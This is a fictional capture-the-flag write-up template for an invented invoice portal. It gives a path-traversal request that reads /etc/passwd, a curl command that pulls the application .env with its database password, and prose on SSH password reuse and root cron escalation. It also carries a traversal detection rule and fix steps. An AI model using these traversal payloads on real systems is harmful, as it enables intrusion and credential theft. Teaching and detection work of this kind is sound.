---
title: 'Example: Paperweight (fictional machine)'
summary: 'Write-up template. An invoice download without path validation exposes the application .env; the reused password opens SSH, and a backup script writable by the application group, run by root cron, completes the escalation.'
lang: en
type: writeup
platform: ctf
platformLabel: 'Fictional CTF (example)'
difficulty: easy
os: linux
eventDate: 2026-10-04
publishedOn: 2026-11-22
example: true
attack: [T1190, T1083, T1552.001, T1078, T1021.004, T1053.003]
timeline:
  - title: Recon
    detail: 'Two open ports: 22 (OpenSSH) and 80 (invoice portal on Nginx).'
  - title: Path traversal in the invoice download
    detail: 'The file parameter is joined to the invoice directory without normalization, so ../ escapes it.'
    attack: [T1190, T1083]
  - title: Credential in .env
    detail: 'The application .env stores the database password, reused by the svc_portal system user.'
    attack: [T1552.001]
  - title: SSH access
    detail: 'Login as svc_portal with the reused password.'
    attack: [T1078, T1021.004]
  - title: Escalation through cron
    detail: 'Root cron runs /opt/backup/run.sh, which the portal group can edit.'
    attack: [T1053.003]
detection:
  level: 2
  rule: web/path_traversal_dotdot
  telemetry:
    - 'Nginx JSON access log: request_uri containing ../ or %2e%2e%2f'
    - 'auth.log: Accepted password for svc_portal from an IP that never logged in before'
    - 'auditd: write to /opt/backup/run.sh by a user other than root'
  logic: |
    detection:
      traversal:
        request_uri|contains:
          - '../'
          - '..%2f'
          - '%2e%2e%2f'
      condition: traversal
  notes: 'The rule covers only the first step. SSH and cron stay as expected telemetry until they get their own rules.'
---

> Fictional content. Hosts use documentation ranges (RFC 5737) and the `.invalid` domain. It does not describe any real machine.

## Recon

```bash
nmap -sC -sV -oN nmap/paperweight 192.0.2.10
```

```text
22/tcp open  ssh     OpenSSH 9.6p1
80/tcp open  http    nginx 1.24.0
|_http-title: Paperweight · Invoice portal
```

## Path traversal in the download

The portal lists invoices with links like `/download?file=invoice-1042.pdf`. Swapping the name for a `../` sequence:

```http
GET /download?file=../../../../etc/passwd HTTP/1.1
Host: paperweight.example.invalid
```

The response returns `/etc/passwd`, including the `svc_portal` user. The same path reads the application config:

```bash
curl -s 'http://paperweight.example.invalid/download?file=../../.env'
```

```text
DB_USER=portal
DB_PASSWORD=fictional-example-not-a-password
```

## Access and escalation

The database password is also `svc_portal`'s SSH password. Inside, the system crontab shows a backup running as root:

```bash
cat /etc/crontab | grep backup
ls -l /opt/backup/run.sh
```

```text
*/5 * * * * root /opt/backup/run.sh
-rwxrwxr-x 1 root portal 214 Oct  4 09:12 /opt/backup/run.sh
```

Since `svc_portal` is in the `portal` group, appending a command to the script and waiting for the next cron cycle is enough. End of the example: flags never appear in posts.

## Fix

- Resolve the path with `realpath` and check it is still inside the invoice directory.
- A dedicated database password, kept outside the webroot.
- Cron script owned by `root:root` with mode `0700`.
